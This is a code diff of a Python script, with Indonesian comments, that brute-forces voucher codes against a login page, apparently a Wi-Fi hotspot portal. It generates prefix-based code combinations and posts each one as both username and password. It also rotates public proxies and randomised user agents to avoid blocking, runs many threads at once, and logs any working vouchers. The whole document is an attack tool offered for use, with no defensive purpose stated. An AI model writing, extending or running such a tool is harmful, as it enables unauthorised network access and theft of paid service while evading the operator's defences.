@@ -1,57 +1,16 @@
 import requests
-import random
 import string
 import threading
 import sys
 import os
-import time
 import itertools
-from queue import Queue
 from concurrent.futures import ThreadPoolExecutor
 
-from user_agents import generate_user_agent
 from banner import print_banner
-
-# Konfigurasi dasar
-TARGET_URL = ""
-TIMEOUT = 5
-MAX_THREADS = 10
-
-# Global resources
-tried_vouchers = set()
-lock = threading.Lock()
-working_proxies = []
-voucher_queue = Queue()
-stop_event = threading.Event()
-
-def safe_input(prompt):
-    try:
-        return input(prompt)
-    except KeyboardInterrupt:
-        print("\n[!] Dihentikan manual.")
-        sys.exit(0)
-
-def get_target_url():
-    config_file = "config.txt"
-    if os.path.exists(config_file):
-        with open(config_file, "r") as f:
-            saved_url = f.read().strip()
-        if saved_url:
-            print(f"[~] URL tersimpan: {saved_url}")
-            use_saved = safe_input("Gunakan URL ini? (y/n): ").strip().lower()
-            if use_saved == "y":
-                return saved_url
-            else:
-                print("[~] Ganti target URL baru.")
-    while True:
-        url = safe_input("Masukkan TARGET_URL (contoh http://192.10.10.1/login): ").strip()
-        if url.startswith("http"):
-            break
-        print("URL harus diawali http:// atau https://")
-    with open(config_file, "w") as f:
-        f.write(url)
-    print(f"[~] TARGET_URL disimpan di {config_file}")
-    return url
+from target import get_target_url, safe_input 
+from worker_mirror import worker_mirror
+import config
+import time
 
 def get_proxies():
     print("[~] Mengambil proxy ...")
@@ -69,6 +28,7 @@ def get_proxies():
         print("Gagal ambil proxy.")
     return proxies
 
+
 def generate_voucher_mirror(prefix, letters_len=2, digits_len=2):
     letters = string.ascii_lowercase
     for letter_pair in itertools.product(letters, repeat=letters_len):
@@ -84,131 +44,158 @@ def generate_voucher_mirror(prefix, letters_len=2, digits_len=2):
                 num_str = str(num).zfill(digits_len)
                 yield f"{prefix}{pair}{num_str}"
 
-def load_tried_vouchers():
-    for fname in ["success.log", "failed.log"]:
+
+def generate_voucher_custom(prefix="7"):
+    letters = string.ascii_lowercase
+    digits = "01"  # cuma 0 atau 1
+    for l1 in letters:
+        for l2 in letters:
+            for l3 in letters:
+                for d1 in digits:
+                    for d2 in digits:
+                        yield f"{prefix}{l1}{l2}{l3}{d1}{d2}"
+
+
+def clear_logs(prefix):
+    for fname in [f"success_{prefix}.log", f"failed_{prefix}.log",
+                  f"success_multi_{prefix}.log", f"failed_multi_{prefix}.log"]:
+        if os.path.exists(fname):
+            os.remove(fname)
+    config.tried_vouchers[prefix] = set()
+    print(f"[~] Semua log untuk prefix {prefix} dibersihkan.")
+
+
+def load_tried_vouchers(prefix):
+    tried = set()
+    for fname in [f"success_{prefix}.log", f"failed_{prefix}.log",
+                  f"success_multi_{prefix}.log", f"failed_multi_{prefix}.log"]:
         if os.path.exists(fname):
             with open(fname, "r") as f:
                 for line in f:
-                    tried_vouchers.add(line.strip())
+                    tried.add(line.strip())
+    config.tried_vouchers[prefix] = tried
+    print(f"[~] Total voucher yang sudah pernah dicoba untuk prefix {prefix}: {len(tried)}")
+
+def load_custom(prefix="7"):
+    print(f"[~] Generating kombinasi khusus untuk prefix {prefix} ...")
+    count = 0
+    tried = config.tried_vouchers.get(prefix, set())
+    for v in generate_voucher_custom(prefix):
+        if config.stop_event.is_set():
+            break
+        if v not in tried:
+            config.voucher_queue.put(v)
+            count += 1
+
+    if count == 0:
+        print(f"[✓] Semua voucher prefix {prefix} sudah pernah dicoba.")
+        choice = safe_input("Mau reset log dan mulai fresh lagi? (y/n): ").strip().lower()
+        if choice == "y":
+            clear_logs()
+            print("[~] Silakan jalankan ulang script untuk mulai fresh.")
+            config.stop_event.set()
+    else:
+        print(f"[~] Total voucher kombinasi baru: {count}")
+        print("[!] Semua voucher selesai digenerate.")
+
 
 def load_mirror(prefix, letters_len=2, digits_len=2):
-    print("[~] Generating kombinasi mirror ...")
-    count = 0
-    for v in generate_voucher_mirror(prefix, letters_len, digits_len):
-        if stop_event.is_set():
+    print(f"[~] Generating kombinasi mirror untuk prefix {prefix} ...")
+    all_vouchers = list(generate_voucher_mirror(prefix, letters_len, digits_len))
+    total = len(all_vouchers)
+
+    tried = config.tried_vouchers.get(prefix, set())
+    new_vouchers = [v for v in all_vouchers if v not in tried]
+
+    if not new_vouchers:
+        choice = input(f"[!] Semua voucher prefix {prefix} sudah dicoba. Reset log dan mulai ulang? (y/n): ")
+        if choice.lower() == "y":
+            for fname in [f"success_{prefix}.log", f"failed_{prefix}.log",
+                          f"success_multi_{prefix}.log", f"failed_multi_{prefix}.log"]:
+                if os.path.exists(fname):
+                    os.remove(fname)
+            config.tried_vouchers[prefix] = set()
+            new_vouchers = all_vouchers  # ulangi dari awal
+        else:
+            print("[~] Tidak ada voucher baru, keluar.")
+            return
+
+    for v in new_vouchers:
+        if config.stop_event.is_set():
             break
-        if v not in tried_vouchers:
-            voucher_queue.put(v)
-            count += 1
-    print(f"[~] Total voucher kombinasi baru: {count}")
+        config.voucher_queue.put(v)
+
+    print(f"[~] Total kemungkinan voucher prefix {prefix}: {total}")
+    print(f"[~] Voucher baru yang akan diuji: {len(new_vouchers)}")
     print("[!] Semua voucher selesai digenerate.")
 
-def worker_mirror(use_proxy, proxy=None):
-    global working_proxies
-    session = requests.Session()
-
-    while not stop_event.is_set():
-        voucher = voucher_queue.get()  # Blocking GET
-        if voucher is None:
-            break
-
-        with lock:
-            tried_vouchers.add(voucher)
-
-        if stop_event.is_set():
-            break
-
-        payload = {
-            "username": voucher,
-            "password": voucher,
-            "dst": "",
-            "popup": "true"
-        }
-        headers = {"User-Agent": generate_user_agent()}
-
-        try:
-            r = session.post(
-                TARGET_URL,
-                data=payload,
-                headers=headers,
-                proxies=proxy if use_proxy else None,
-                timeout=TIMEOUT
-            )
-
-            if "status" in r.text.lower() or "logout" in r.text.lower():
-                print(f"[+] SUCCESS: {voucher}")
-                with open("success.log", "a") as f:
-                    f.write(voucher + "\n")
-                stop_event.set()
-                break
-            else:
-                print(f"[-] Failed: {voucher}")
-                with open("failed.log", "a") as f:
-                    f.write(voucher + "\n")
-
-        except Exception as e:
-            print(f"[!] Proxy error {proxy} | {e}")
-            if use_proxy:
-                with lock:
-                    if proxy in working_proxies:
-                        working_proxies.remove(proxy)
-                    if not working_proxies:
-                        print("[!] Semua proxy mati.")
-                        stop_event.set()
-                        break
-                if working_proxies:
-                    proxy = random.choice(working_proxies)
-
-        time.sleep(random.uniform(0.5, 2.0))
 
 def main():
     print_banner()
-    global TARGET_URL
-    TARGET_URL = get_target_url()
+    config.TARGET_URL = get_target_url()
 
-    print("=== Voucher Brute Force Mirror ===")
-    prefix = safe_input("Prefix fix (contoh 12): ").strip()
-    letters_len = 2
-    digits_len = 2
+    print("=== Voucher Brute Force Mirror + Multi-Login Test ===")
+    prefix = safe_input("Prefix fix (contoh 12 atau 7): ").strip()
 
     use_proxy = safe_input("Gunakan proxy? (y/n): ").strip().lower() == "y"
 
-    load_tried_vouchers()
+    load_tried_vouchers(prefix)
 
-    global working_proxies
     if use_proxy:
-        working_proxies = get_proxies()
-        if not working_proxies:
+        config.working_proxies = get_proxies()
+        if not config.working_proxies:
             print("Tidak ada proxy aktif.")
             sys.exit(1)
     else:
-        working_proxies = []
+        config.working_proxies = []
 
-    print(f"[~] Mulai brute mirror {prefix}aa01 sampai {prefix}zz99 ... Tekan Ctrl+C untuk berhenti.\n")
+    # pilih generator sesuai prefix
+    if prefix.startswith("7"):
+        generator_func = load_custom
+        generator_args = (prefix,)
+    else:
+        generator_func = load_mirror
+        generator_args = (prefix, 2, 2)
+
+    print(f"[~] Mulai brute prefix {prefix} ... Tekan Ctrl+C untuk berhenti.\n")
 
     generator_thread = threading.Thread(
-        target=load_mirror,
-        args=(prefix, letters_len, digits_len)
+        target=generator_func,
+        args=generator_args,
+        daemon=True  # biar otomatis mati kalau main thread mati
     )
     generator_thread.start()
 
+      # 🕐 delay sebelum mulai worker
+    generator_thread.join()  # tunggu voucher selesai digenerate
+    print("\n[~] Voucher selesai digenerate. Mulai testing dalam 3 detik...\n")
+    time.sleep(3)
+
     try:
-        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-            for i in range(MAX_THREADS):
-                proxy = working_proxies[i % len(working_proxies)] if use_proxy else None
-                executor.submit(worker_mirror, use_proxy, proxy)
+        with ThreadPoolExecutor(max_workers=config.MAX_THREADS) as executor:
+            futures = []
+            for i in range(config.MAX_THREADS):
+                proxy = config.working_proxies[i % len(config.working_proxies)] if use_proxy else None
+                futures.append(executor.submit(worker_mirror, use_proxy, proxy, prefix))
 
-        generator_thread.join()
-
-        for _ in range(MAX_THREADS):
-            voucher_queue.put(None)
+            while generator_thread.is_alive() or not config.voucher_queue.empty():
+                generator_thread.join(timeout=1)  # cek tiap detik
+                if config.stop_event.is_set():
+                    break
 
     except KeyboardInterrupt:
-        print("\n[!] Dihentikan manual.")
-        stop_event.set()
-        generator_thread.join()
+        print("\n[!] Dihentikan manual oleh user (CTRL+C).")
+        config.stop_event.set()
+        # kirim sentinel untuk semua worker biar langsung keluar
+        for _ in range(config.MAX_THREADS):
+            config.voucher_queue.put(None)
+
+    finally:
+        generator_thread.join(timeout=1)
+        # pastikan worker selesai
+        for _ in range(config.MAX_THREADS):
+            config.voucher_queue.put(None)
+
 
 if __name__ == "__main__":
     main()
-# This code is a brute force script for testing voucher codes against a specified target URL.
-# It includes features for proxy support, multithreading, and voucher generation.
